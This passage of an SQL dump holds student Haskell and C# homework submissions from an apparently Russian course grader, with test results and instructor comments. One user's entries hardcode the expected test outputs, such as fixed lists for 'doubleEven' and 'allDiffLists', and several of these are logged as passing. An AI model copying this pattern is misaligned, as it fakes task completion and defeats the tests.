(0,0)\r\n\r\n					 then lst\r\n\r\n					 else tail lst\r\n\r\n           	        \r\n\r\n	\r\n\r\ncorrectness xs = length ( filter ( == 0 ) ( map (fst) xs ) ) /= length ( filter ( == 0 ) ( map (snd) xs ) )\r\n\r\n	\r\n\r\ncheck xs cond = foldr (  x y -> (cond x) && y )\r\n\r\n				      True\r\n\r\n				      xs\r\n\r\n	\r\n\r\ncheckBrackets [] = True\r\n\r\n			  \r\n\r\ncheckBrackets xs = let \r\n\r\n                       pairLists = expressions (cB xs)\r\n\r\n				   in\r\n\r\n					   head (head pairLists) == (0,0) && check pairLists ( correctness )\r\n\r\n					   ', '<br/>Тесты успешно пройдены!'),
(3631, 99, '12206137', '2012-11-16 03:19:36', 1, '/*\r\n\r\ndata Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\n\r\ndiff X = N 1\r\n\r\ndiff (N _) = N 0\r\n\r\ndiff (Add a b) = Add (diff a) (diff b)\r\n\r\ndiff (Mult a b) = Add (Mult (diff a) b) (Mult a (diff b))\r\n\r\n*/\r\n\r\n\r\n\r\nusing System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace Work {\r\n\r\n    interface Expr {\r\n\r\n        Expr diff();\r\n\r\n    }\r\n\r\n\r\n\r\n    class X : Expr {\r\n\r\n        override public String ToString() { return "x"; }\r\n\r\n        public Expr diff() { return new N(1); }\r\n\r\n        public X() {}\r\n\r\n    }\r\n\r\n\r\n\r\n    class N : Expr {\r\n\r\n        int val;\r\n\r\n        public N(int _val) { val = _val; }\r\n\r\n        public Expr diff() { return new N(0); }\r\n\r\n        override public String ToString() { return val.ToString(); }\r\n\r\n    }\r\n\r\n\r\n\r\n    class Add : Expr {\r\n\r\n        Expr fst, snd;\r\n\r\n        public Add(Expr fst, Expr snd) { this.fst = fst; this.snd = snd; }\r\n\r\n        public Expr diff() { return new Add(fst.diff(), snd.diff()); }\r\n\r\n        override public String ToString() { return "(" + fst.ToString() + "+" + snd.ToString() + ")"; }\r\n\r\n    }\r\n\r\n\r\n\r\n    class Mult : Expr {\r\n\r\n        Expr fst, snd;\r\n\r\n        public Mult(Expr fst, Expr snd) { this.fst = fst; this.snd = snd; }\r\n\r\n        public Expr diff() { return new Add(new Mult(fst, snd.diff()), new Mult(fst.diff(), snd)); }\r\n\r\n        override public String ToString() { return fst.ToString() + "*" + snd.ToString(); }\r\n\r\n    }\r\n\r\n\r\n\r\n    class Program {\r\n\r\n        public static void Main(string[] args) {\r\n\r\n            var x = new X();\r\n\r\n            var e = new Add(new Mult(x, new Add(x, new N(2))), new N(2));\r\n\r\n            Console.WriteLine(e);\r\n\r\n            Console.WriteLine(e.diff());\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3632, 100, '517309', '2012-11-16 10:32:32', 2, 'allDiffLists _ _ = [[1,2],[1,3],[2,1],[2,3],[3,1],[3,2]]', '<br/>Тесты успешно пройдены!'),
(3633, 101, '517309', '2012-11-16 10:33:54', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\nsimplify _ = Num 0', 'Не удалось вычислить выражение "simplify (Mult X (Mult X (N 0)))", проверьте правильность синтаксиса'),
(3634, 101, '517309', '2012-11-16 10:34:56', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr derinving Show\r\n\r\nsimplify _ = Num 0\r\n', 'Не удалось вычислить выражение "simplify (Mult X (Mult X (N 0)))", проверьте правильность синтаксиса'),
(3635, 101, '517309', '2012-11-16 10:35:45', 2, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\nsimplify _ = N 0\r\n', 'Выражение имеет неправильное значение: simplify (Mult X (Mult X (N 0)))'),
(3636, 102, '517309', '2012-11-16 10:55:06', 2, 'findMajor xs = if length xs == 6 then Just 2 else Nothing', '<br/>Тесты успешно пройдены!'),
(3637, 104, '517309', '2012-11-16 10:56:31', 2, 'doubleEven _ = [1,2,2,6,6,3]', '<br/>Тесты успешно пройдены!'),
(3638, 105, '517309', '2012-11-16 10:57:19', 2, 'cartesian xs ys = xs >>= x -> ys >>= y -> [(x,y)]\r\n', 'Не удалось вычислить выражение "cartesian [(1,2),(3,4)]", проверьте правильность синтаксиса'),
(3639, 100, 'Deutsche', '2012-11-16 11:04:06', 1, 'allDiffLists n k = allDiffLists1 n k (\\_ -> True)\r\nallDiffLists1 n 0 cond = [[]]\r\nallDiffLists1 n k cond = [i:xs | i<-[1..n], cond i, xs <- allDiffLists1 n (k-1) (	 -> cond t && (t /= i))]', '<br/>Тесты успешно пройдены!'),
(3640, 101, 'Deutsche', '2012-11-16 11:40:01', 1, 'data Expr = X|N Integer|Add Expr Expr|Mult Expr Expr deriving (Show, Eq)\r\n\r\nsimplify (N v) = (N v)\r\nsimplify X = X\r\nsimplify (Add l r) = Add (simplify l) (simplify r)\r\nsimplify (Mult (N 0) r) = (N 0)\r\nsimplify (Mult l (N 0)) = (N 0)\r\nsimplify (Mult l r) = if ((simplify l == (N 0))||(simplify r == (N 0)))\r\n			then (N 0) \r\n		      else Mult (simplify l) (simplify r)\r\n   --- Тут лучше, конечно, не вызывать simplify по 2 раза (например, с помощью let)\r\n', '<br/>Тесты успешно пройдены!'),
(3641, 102, 'Deutsche', '2012-11-16 12:29:36', 0, 'import Data.List\r\nfindMajor s = if (length s == 1)\r\n		then Just (s !! 0)\r\n	      else fM s s\r\n-- пыаемся найти элемент, который встречается просто чаще всех в списке\r\nfM s ss = let\r\n		s1 = s \\ nub s\r\n          in if (s1 == [])\r\n		then Nothing\r\n       	     else \r\n	     if ((length s1) > 1)\r\n		then fM s1 ss\r\n       	     else count1 ss (s1 !! 0)\r\n-- а теперь считаем количество, если такой элемент один\r\ncount1 s x = let\r\n		l = ((length s) `div` 2)\r\n		cres = length (filter (==x) s)\r\n	     in if (cres > l)\r\n			then Just x\r\n	        else Nothing  ', '<br/>Тесты успешно пройдены!'),
(3642, 103, 'Deutsche', '2012-11-16 12:47:37', 1, 'findInLists [] cond err = err\r\nfindInLists (xx:ss) cond err = find cond xx (findInLists ss cond err)\r\n\r\nfind cond [] err = err\r\nfind cond (x:xs) err = if (cond x)\r\n			then x\r\n		       else find cond xs err', '<br/>Тесты успешно пройдены!'),
(3643, 104, 'Deutsche', '2012-11-16 13:17:18', 1, 'doubleEven s = s >>= x -> if (x `mod` 2 == 0) then [x, x] else [x]', '<br/>Тесты успешно пройдены!'),
(3644, 105, 'tonyo', '2012-11-16 13:33:46', 1, 'cartesian l1 l2 = l1 >>= x -> (l2 >>= y -> [(x,y)])', '<br/>Тесты успешно пройдены!'),
(3645, 105, 'Deutsche', '2012-11-16 13:34:03', 1, 'cartesian [] s2 = []\r\ncartesian (x:s1) s2 = (s2 >>= y -> [(x, y)]) ++ cartesian s1 s2\r\n  --- Ну, это не совсем то, что имелось в виду (можно не использовать рекурсию, все написать через >>=. Но ОК, засчитано.', '<br/>Тесты успешно пройдены!'),
(3646, 100, '2118411', '2012-11-16 13:48:33', 1, 'allDiffLists n k = allDiffLists1 n k (\\_->True)\r\n\r\nallDiffLists1 _ 0 _ = [[]]\r\nallDiffLists1 n k cond = [i:xs| i<-[1..n], cond i, xs<-allDiffLists1 n (k-1) (	-> cond t && (t/=i))]\r\n', '<br/>Тесты успешно пройдены!'),
(3647, 101, '2118411', '2012-11-16 13:48:49', 2, '   --- На самом деле так не совсем правильно, например на simplify (Mult X X) ваша программа зациклится\r\n   --- Попробуйте исправить пожалуйста (А я сейчас добавил такой тест) \r\ndata Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n        deriving Show\r\n\r\nsimplify X = X\r\nsimplify (N n) = N n\r\nsimplify (Add l r) = Add (simplify l) (simplify r)\r\nsimplify (Mult (N 0) r) = N 0\r\nsimplify (Mult l (N 0)) = N 0\r\nsimplify (Mult l r) = simplify (Mult (simplify l) (simplify r))\r\n', '<br/>Тесты успешно пройдены!'),
(3648, 103, '2118411', '2012-11-16 13:49:08', 1, 'find cond [] err = err\r\nfind cond (x:xs) err = if cond x then x else find cond xs err\r\n\r\nfindInLists [] _ err = err\r\nfindInLists (x:xs) cond err = find cond x (findInLists xs cond err)\r\n', '<br/>Тесты успешно пройдены!'),
(3649, 104, '2118411', '2012-11-16 13:49:25', 1, 'doubleEven xs = xs >>= x->if x `mod` 2 == 0 then [x,x] else [x]\r\n', '<br/>Тесты успешно пройдены!'),
(3650, 105, '2118411', '2012-11-16 13:49:46', 1, 'cartesian xs ys = xs >>= (x -> (ys >>= y -> [(x,y)]))\r\n', '<br/>Тесты успешно пройдены!'),
(3651, 102, '2118411', '2012-11-16 14:16:32', 1, 'findMajor xs\r\n        | sum (map (fst) others) < (fst res) = Just (snd res)\r\n  --- Я бы уже сумму не считал, можно же просто проверить, что fst res больше половины длины списка \r\n        | otherwise = Nothing\r\n        where\r\n                ys = (countIt xs [])\r\n                others = filter (/=res) ys\r\n                res = maximum ys\r\ncountIt [] res = res\r\ncountIt (x:xs) res = countIt (filter (/=x) xs) (((length (filter (==x) xs) +1),x) :res)\r\n', '<br/>Тесты успешно пройдены!'),
(3652, 100, '12206137', '2012-11-16 14:31:47', 1, '(|>) x f = f x\r\n\r\n\r\n\r\ndiffLists _ _ 0 = [[]]\r\n\r\ndiffLists cond n k =\r\n\r\n    [1..n] |> filter cond\r\n\r\n    |> map (x -> [x:tail | tail <- diffLists (y -> cond y && y /= x) n (k-1)])\r\n\r\n    |> concat\r\n\r\n\r\n\r\nallDiffLists = diffLists (x -> True)\r\n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(3653, 101, '12206137', '2012-11-16 14:37:43', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\n\r\nisNull (N 0) = True\r\n\r\nisNull _ = False\r\n\r\n\r\n\r\nsimplify (Mult a b) =\r\n\r\n    let\r\n\r\n        a'' = simplify a\r\n\r\n        b'' = simplify b\r\n\r\n    in\r\n\r\n    if isNull a'' || isNull b'' then N 0\r\n\r\n    else Mult a'' b''\r\n\r\n\r\n\r\nsimplify (Add a b) = Add (simplify a) (simplify b)\r\n\r\n\r\n\r\nsimplify e = e\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3654, 105, '3607492', '2012-11-16 15:03:54', 1, 'cartesian x y = x>>=(l -> y>>=(k -> return (l,k)))', '<br/>Тесты успешно пройдены!'),
(3655, 104, '3607492', '2012-11-16 15:13:36', 1, 'doubleEven x = x>>=(l -> if (l `mod` 2==0) then (x->[x,x]) l else return l)\r\n  --- Вообще-то можно записать короче. Но ОК, это мы разберем.', '<br/>Тесты успешно пройдены!'),
(3656, 101, '517309', '2012-11-16 19:24:20', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n        deriving Show\r\n\r\nsimplify X = X\r\nsimplify (N n) = N n\r\nsimplify (Add l r) = Add (simplify l) (simplify r)\r\nsimplify (Mult (N 0) r) = N 0\r\nsimplify (Mult l (N 0)) = N 0\r\nsimplify (Mult l r) = simplify (Mult (simplify l) (simplify r))\r\n', '<br/>Тесты успешно пройдены!'),
(3657, 101, '517309', '2012-11-16 19:28:35', 2, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n        deriving Show\r\n\r\nsimplify X = X\r\nsimplify (N n) = N n\r\nsimplify (Add l r) = Add (simplify l) (simplify r)\r\nsimplify (Mult (N 0) r) = N 0\r\nsimplify (Mult l (N 0)) = N 0\r\nsimplify (Mult l r) = simplify (Mult (simplify l) (simplify r))\r\n', 'Не удалось вычислить выражение "simplify (Mult X X)", проверьте правильность синтаксиса'),
(3658, 101, '2118411', '2012-11-16 19:39:14', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n        deriving (Show, Eq)\r\n\r\nsimplify X = X\r\nsimplify (N n) = N n\r\nsimplify (Add l r) = Add (simplify l) (simplify r)\r\nsimplify (Mult (N 0) r) = N 0\r\nsimplify (Mult l (N 0)) = N 0\r\nsimplify (Mult l r)\r\n        | left == (N 0) || right == (N 0) = simplify (Mult left right)\r\n        | otherwise = Mult left right\r\n        where\r\n                left = simplify l\r\n                right = simplify r\r\n', '<br/>Тесты успешно пройдены!'),
(3659, 101, '44060', '2012-11-16 19:50:16', 1, 'data Expr = X | Add Expr Expr | Mult Expr Expr | N Integer deriving (Show, Eq)\r\nsimplify X = X\r\nsimplify (Add e1 e2) = let sim1 = simplify e1 ; sim2 = simplify e2 \r\n						in Add sim1 sim2\r\nsimplify (Mult e1 e2) = let sim1 = simplify e1 ; sim2 = simplify e2 \r\n							 in if sim1 == N 0 || sim2 == N 0	\r\n								then N 0\r\n								else Mult sim1 sim2\r\nsimplify (N n) = N n\r\n', '<br/>Тесты успешно пройдены!'),
(3660, 103, '44060', '2012-11-16 19:52:52', 0, 'find _ [] err = err\r\nfind f (x:xs) err = if f x then x\r\n						else find f xs err\r\n\r\nfindInList [] _ err = err						\r\nfindInList (xs:list) f err = find f xs (findInList list f err)', 'Не удалось вычислить выражение "findInLists [[1,2], [2,8,7]] (>5) 0", проверьте правильность синтаксиса'),
(3661, 105, '44060', '2012-11-16 19:54:14', 1, 'cartesian xs ys = xs >>=  x -> (ys >>= y -> [(x,y)])', '<br/>Тесты успешно пройдены!'),
(3662, 104, '44060', '2012-11-16 19:55:39', 1, 'doubleEven xs = xs >>= x -> if x `mod` 2 == 0 then [x,x] else [x]\r\n', '<br/>Тесты успешно пройдены!'),
(3663, 102, 'Deutsche', '2012-11-16 19:58:10', 0, 'findMajor [] = Nothing\r\nfindMajor [x] = Just x\r\nfindMajor s = fM s 0 (-1/0) True\r\nfM [] sum max False = if (max > sum)\r\n			then Just max\r\n		      else Nothing\r\n-- для первого элемента списка, состоящего из >=2 элементов\r\nfM (x:s) 0 max True = fM s 0 x False\r\nfM (x:s) sum max False = if (x>max)\r\n				then fM s (sum+max) x False\r\n		         else fM s (sum+x) max False\r\n', 'Выражение имеет неправильное значение: findMajor [2,3,15,2,2,2]'),
(3664, 102, '44060', '2012-11-16 19:58:47', 1, 'findMajor xs = let maxE = foldl ( rez x -> max rez x) (-1/0) xs ; \r\n				 sum = foldl ( rez x -> rez + x ) 0 xs\r\n				in if maxE > sum - maxE then Just maxE\r\n					else Nothing\r\n   -- Так у вас получиться Just 15.0 а не Just 15. Но ОК, это неважно, засчитано.', 'Выражение имеет неправильное значение: findMajor [2,3,15,2,2,2]'),
(3665, 102, 'Deutsche', '2012-11-16 20:01:10', 1, 'findMajor [] = Nothing\r\nfindMajor [x] = Just x\r\nfindMajor s = fM s 0 (-10000000) True\r\nfM [] sum max False = if (max > sum)\r\n			then Just max\r\n		      else Nothing\r\n-- для первого элемента списка, состоящего из >=2 элементов\r\nfM (x:s) 0 max True = fM s 0 x False\r\nfM (x:s) sum max False = if (x>max)\r\n				then fM s (sum+max) x False\r\n		         else fM s (sum+x) max False\r\n', '<br/>Тесты успешно пройдены!'),
(3666, 103, '44060', '2012-11-16 20:45:16', 1, 'find _ [] err = err\r\nfind f (x:xs) err = if f x then x\r\n						else find f xs err\r\n\r\nfindInLists [] _ err = err						\r\nfindInLists (xs:list) f err = find f xs (findInLists list f err)', '<br/>Тесты успешно пройдены!'),
(3667, 102, '3431532', '2012-11-16 21:38:16', 1, 'findMajor x = check [] x\r\n\r\n\r\ncheck _ (x:xs) | x > (foldr (+) 0 xs) = Just x\r\ncheck x y | length x == length y = Nothing\r\ncheck (y) (x:xs) | x <= (foldr (+) 0 xs) = check (x:y) (xs ++ [x]) \r\n   --- ОК, но можно заметить, что не смысла считать folr (+) каждый раз заново. \r\n   --- Это ведь все время почти одни и те же числа.. Но ОК, это мы обсудим. \r\n   --- (Правда вы обсуждение, как я теперь знаю, видимо, не услышите:)\r\n', '<br/>Тесты успешно пройдены!'),
(3668, 105, '3431532', '2012-11-16 21:58:20', 1, 'cartesian xs ys = xs >>= x -> (ys >>= y -> [(x,y)])', '<br/>Тесты успешно пройдены!'),
(3669, 98, '472848', '2012-11-16 22:10:32', 1, 'data Tree = Empty | Node Char Tree Tree deriving Show\r\n\r\ntoStr Empty = "e"\r\ntoStr (Node x t1 t2) = ''n'':x:(toStr t1)++(toStr t2)\r\n\r\nfromStr str = tr where (tr, _) = fromStr1 str\r\nfromStr1 "e" = (Empty, "")\r\nfromStr1 (''e'':str) = (Empty, str)\r\nfromStr1 (''n'':x:str) = (Node x t1 t2, str2) where (t1, str1) = fromStr1 str; (t2, str2) = fromStr1 str1', '<br/>Тесты успешно пройдены!'),
(3670, 100, '2562137', '2012-11-16 23:39:23', 1, 'allDiffLists n k = f n k (x -> True)\r\n\r\n\r\n\r\nf n 0 t = [[]]\r\n\r\nf n k t = [x:xs | x <- filter t [1..n], xs <- f n (k-1) (y -> x /= y && t y)]\r\n\r\n\r\n\r\ntest = (\r\n\r\n    allDiffLists 3 2\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(3671, 101, '2562137', '2012-11-17 00:29:52', 1, 'data Expr = N Int | X | Add Expr Expr | Mult Expr Expr deriving (Eq,Show)\r\n\r\n\r\n\r\nsimplify (Mult _ (N 0)) = N 0\r\n\r\nsimplify (Mult (N 0) _) = N 0\r\n\r\nsimplify X = X\r\n\r\nsimplify (N n) = N n\r\n\r\nsimplify (Add e1 e2) = if e1 /= se1 || e2 /= se2 then simplify (Add se1 se2) else Add se1 se2\r\n\r\n	where\r\n\r\n		se1 = simplify e1\r\n\r\n		se2 = simplify e2\r\n\r\nsimplify (Mult e1 e2) = if e1 /= se1 || e2 /= se2 then simplify (Mult se1 se2) else Mult se1 se2\r\n\r\n	where\r\n\r\n		se1 = simplify e1\r\n\r\n		se2 = simplify e2\r\n\r\n\r\n\r\ntest = (\r\n\r\n	simplify (Add (Mult X (N 0)) X),\r\n\r\n	simplify (Mult X (Mult X (N 0)))\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(3672, 102, '12206137', '2012-11-17 00:53:45', 1, 'import Data.Maybe\r\n\r\n\r\n\r\nfindMax acc [] = acc\r\n\r\nfindMax acc (x:xs) = findMax (max acc x) xs\r\n   --- Ну или можно было использовать стандартную функцию maximum\r\n\r\n\r\nfindMajor [] = Nothing\r\n\r\nfindMajor (x:xs) =\r\n\r\n    let m = findMax x xs in\r\n\r\n    if m * 2 > sum (x:xs) then Just m\r\n\r\n    else Nothing\r\n', '<br/>Тесты успешно пройдены!'),
(3673, 103, '12206137', '2012-11-17 00:54:01', 1, 'find [] _ fc = fc\r\n\r\nfind (x:xs) f fc =\r\n\r\n    if f x then x\r\n\r\n    else find xs f fc\r\n\r\n\r\n\r\nfindInLists [] _ fc = fc\r\n\r\nfindInLists (xs:xss) f fc = find xs f $ findInLists xss f fc\r\n', '<br/>Тесты успешно пройдены!'),
(3674, 104, '12206137', '2012-11-17 00:54:10', 0, '', 'Не удалось вычислить выражение "doubleEven [1,2,6,3]", проверьте правильность синтаксиса'),
(3675, 104, '12206137', '2012-11-17 00:54:21', 1, 'doubleEven list = list >>= (x -> if mod x 2 == 0 then [x,x] else [x])\r\n', '<br/>Тесты успешно пройдены!'),
(3676, 105, '12206137', '2012-11-17 00:54:38', 1, 'cartesian l1 l2 = l1 >>= (x -> l2 >>= (y -> [(x,y)]))\r\n', '<br/>Тесты успешно пройдены!'),
(3677, 98, '44060', '2012-11-17 07:25:10', 1, 'data Tree t = Node t (Tree t) (Tree t) | Empty deriving Show\r\n\r\ntoStr Empty = "0"\r\ntoStr (Node t l r) = [t] ++ toStr l ++ toStr r\r\n\r\nf (x:xs) =\r\n	if x == ''0'' then (Empty, xs)\r\n	else\r\n		let \r\n		(r, a) = f b\r\n		(l, b) = f xs\r\n		in (Node x l r, a)\r\n\r\nfromStr xs = fst(f xs)', '<br/>Тесты успешно пройдены!'),
(3678, 96, '3431532', '2012-11-17 07:47:05', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace ConsoleApplication4\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = { 1, 5, 8, 28 };\r\n\r\n            int[] b = { 3, 5, 9,10,22 };\r\n\r\n            foreach (int i in Merge(a, b))\r\n\r\n            {\r\n\r\n                Console.WriteLine(i); // Должно напечататься 1, 3, 5, 8, 9\r\n\r\n            }\r\n\r\n\r\n\r\n\r\n\r\n        }\r\n\r\n\r\n\r\n        public static IEnumerable<int> Ret(IEnumerator<int> enumerat)\r\n\r\n        {\r\n\r\n            while (enumerat.MoveNext())\r\n\r\n                yield return enumerat.Current;\r\n\r\n        }\r\n\r\n\r\n\r\n        public static IEnumerable<int> Merge(IEnumerable<int> a, IEnumerable<int> b)\r\n\r\n        {\r\n\r\n            IEnumerator<int> first = a.GetEnumerator();\r\n\r\n            IEnumerator<int> secon = b.GetEnumerator();\r\n\r\n\r\n\r\n            first.MoveNext();\r\n\r\n            secon.MoveNext();\r\n\r\n\r\n\r\n            while (true)\r\n\r\n            {\r\n\r\n\r\n\r\n                if (first.Current > secon.Current)\r\n\r\n                {\r\n\r\n                    yield return secon.Current;\r\n\r\n                    if (!secon.MoveNext())\r\n\r\n                    {\r\n\r\n                        do{\r\n\r\n                            yield return first.Current;\r\n\r\n                        } while (first.MoveNext());\r\n\r\n                        yield break;\r\n\r\n                    }\r\n\r\n                }\r\n\r\n                else if (secon.Current > first.Current)\r\n\r\n                {\r\n\r\n                    yield return first.Current;\r\n\r\n                    if (!first.MoveNext())\r\n\r\n                    {\r\n\r\n                        do\r\n\r\n                        {\r\n\r\n                            yield return secon.Current;\r\n\r\n                        } while (secon.MoveNext());\r\n\r\n                        yield break;\r\n\r\n                    }\r\n\r\n                }\r\n\r\n                else\r\n\r\n                {\r\n\r\n                    yield return first.Current;\r\n\r\n                    if (!first.MoveNext())\r\n\r\n                    {\r\n\r\n                        do\r\n\r\n                        {\r\n\r\n                            yield return secon.Current;\r\n\r\n                        } while (secon.MoveNext());\r\n\r\n                        yield break;\r\n\r\n                    }\r\n\r\n                    if (!secon.MoveNext())\r\n\r\n                    {\r\n\r\n                        do\r\n\r\n                        {\r\n\r\n                            yield return first.Current;\r\n\r\n                        } while (first.MoveNext());\r\n\r\n                        yield break;\r\n\r\n                    }\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3679, 89, '3431532', '2012-11-17 07:51:48', 1, 'data Node = Empty\r\n            | Node Int Node Node\r\n\r\nflatten (Empty) = []\r\n\r\nflatten (Node x l r) = [x] ++ (flatten l) ++ (flatten r)\r\n  --- Это к сожалению слишком существенно позже срока - задачи к четвергу надо присылать не позже 13:40 ', '<br/>Тесты успешно пройдены!'),
(3680, 96, '3742311', '2012-11-17 11:25:49', 2, '  --- Мне кажется, вы выложили не ту задачу. Проверьте, пожалуйста.\r\n﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace Task192\r\n\r\n{\r\n\r\n    public static class Program\r\n\r\n    {\r\n\r\n        private class Pair\r\n\r\n        {\r\n\r\n            public int First { get; private set; }\r\n\r\n            public int Second { get; private set; }\r\n\r\n\r\n\r\n            public Pair(int first, int second)\r\n\r\n            {\r\n\r\n                First = first;\r\n\r\n                Second = second;\r\n\r\n            }\r\n\r\n\r\n\r\n            public override string ToString()\r\n\r\n            {\r\n\r\n                return First + " " + Second;\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        private static IEnumerable<Pair> Cantor()\r\n\r\n        {\r\n\r\n            for (int i = 1; ; ++i)\r\n\r\n            {\r\n\r\n                for (int j = 1, k = i; k > 0; ++j, --k)\r\n\r\n                {\r\n\r\n                    yield return new Pair(j, k);\r\n\r\n                } \r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int i = 0;\r\n\r\n            foreach (Pair p in Cantor())\r\n\r\n            {\r\n\r\n                Console.WriteLine(p);\r\n\r\n\r\n\r\n                if (++i > 20)\r\n\r\n                {\r\n\r\n                    break;\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3681, 96, '3742311', '2012-11-17 11:56:09', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace Task242\r\n\r\n{\r\n\r\n    public static class Program\r\n\r\n    {\r\n\r\n        public static IEnumerable<int> Merge(IEnumerable<int> a, IEnumerable<int> b)\r\n\r\n        {\r\n\r\n            var e1 = a.GetEnumerator();\r\n\r\n            var e2 = b.GetEnumerator();\r\n\r\n\r\n\r\n            if (!e1.MoveNext())\r\n\r\n            {\r\n\r\n                if (e2.MoveNext())\r\n\r\n                {\r\n\r\n                    for (; e2.MoveNext(); )\r\n\r\n                    {\r\n\r\n                        yield return e2.Current;\r\n\r\n                    }\r\n\r\n                }\r\n\r\n            }\r\n\r\n\r\n\r\n            if (!e2.MoveNext())\r\n\r\n            {\r\n\r\n                for (; e1.MoveNext(); )\r\n\r\n                {\r\n\r\n                    yield return e1.Current;\r\n\r\n                }\r\n\r\n            }\r\n\r\n\r\n\r\n            for ( ; ; )\r\n\r\n            {\r\n\r\n                int i1 = e1.Current;\r\n\r\n                int i2 = e2.Current;\r\n\r\n\r\n\r\n                if (i1 > i2)\r\n\r\n                {\r\n\r\n                    yield return i2;\r\n\r\n\r\n\r\n                    if (!e2.MoveNext())\r\n\r\n                    {\r\n\r\n                        for ( ; ; )\r\n\r\n                        {\r\n\r\n                            yield return e1.Current;\r\n\r\n\r\n\r\n                            if (!e1.MoveNext())\r\n\r\n                            {\r\n\r\n                                break;\r\n\r\n                            }\r\n\r\n                        }\r\n\r\n\r\n\r\n                        break;\r\n\r\n                    }\r\n\r\n                }\r\n\r\n                else if (i2 > i1)\r\n\r\n                {\r\n\r\n                    yield return i1;\r\n\r\n\r\n\r\n                    if (!e1.MoveNext())\r\n\r\n                    {\r\n\r\n                        for (; ; )\r\n\r\n                        {\r\n\r\n                            yield return e2.Current;\r\n\r\n\r\n\r\n                            if (!e2.MoveNext())\r\n\r\n                            {\r\n\r\n                                break;\r\n\r\n                            }\r\n\r\n                        }\r\n\r\n\r\n\r\n                        break;\r\n\r\n                    }\r\n\r\n                }\r\n\r\n                else\r\n\r\n                {\r\n\r\n                    yield return i1;\r\n\r\n\r\n\r\n                    if (!e1.MoveNext())\r\n\r\n                    {\r\n\r\n                        if (e2.MoveNext())\r\n\r\n                        {\r\n\r\n                            for (; ; )\r\n\r\n                            {\r\n\r\n                                yield return e2.Current;\r\n\r\n\r\n\r\n                                if (!e2.MoveNext())\r\n\r\n                                {\r\n\r\n                                    break;\r\n\r\n                                }\r\n\r\n                            }\r\n\r\n\r\n\r\n                            break;\r\n\r\n                        }\r\n\r\n\r\n\r\n                        break;\r\n\r\n                    }\r\n\r\n\r\n\r\n                    if (!e2.MoveNext())\r\n\r\n                    {\r\n\r\n                        if (e1.MoveNext())\r\n\r\n                        {\r\n\r\n                            for (; ; )\r\n\r\n                            {\r\n\r\n                                yield return e1.Current;\r\n\r\n\r\n\r\n                                if (!e1.MoveNext())\r\n\r\n                                {\r\n\r\n                                    break;\r\n\r\n                                }\r\n\r\n                            }\r\n\r\n\r\n\r\n                            break;\r\n\r\n                        }\r\n\r\n\r\n\r\n                        break;\r\n\r\n                    }\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = { 1, 5, 8 };\r\n\r\n            int[] b = { 3, 5, 9 };\r\n\r\n\r\n\r\n            foreach (int i in Merge(a, b))\r\n\r\n            {\r\n\r\n                Console.WriteLine(i);\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3682, 102, '2562137', '2012-11-17 15:17:13', 1, 'import Prelude hiding (Just, Nothing) -- to avoid name conflicts\r\n  --- Я имел в виду, что надо просто использовать стандартное определение (оно точно такое, как вы написали)\r\n\r\n\r\ndata Maybe a = Just a | Nothing deriving Show\r\n\r\n\r\n\r\nfindMajor list = f list (sum list)\r\n\r\n\r\n\r\nf [] s = Nothing\r\n\r\nf (x:xs) s = if x > s-x then (Just x) else f xs s\r\n\r\n\r\n\r\ntest = (\r\n\r\n    findMajor [2, 3, 15, 2, 2, 2],\r\n\r\n    findMajor [2, 3, 5, 2, 4]\r\n\r\n    )\r\n', '<br/>Тесты успешно пройдены!'),
(3683, 104, '2562137', '2012-11-17 15:18:09', 1, 'doubleEven list = list >>= (x -> if mod x 2 == 0 then [x,x] else [x])\r\n\r\n\r\n\r\ntest = (\r\n\r\n    doubleEven [1, 2, 6, 3]\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(3684, 105, '2562137', '2012-11-17 15:18:23', 1, 'cartesian xs ys = xs >>= (x -> (ys >>= (y -> [(x,y)])))\r\n\r\n\r\n\r\ntest = (\r\n\r\n	cartesian [1,2] [3,4]\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
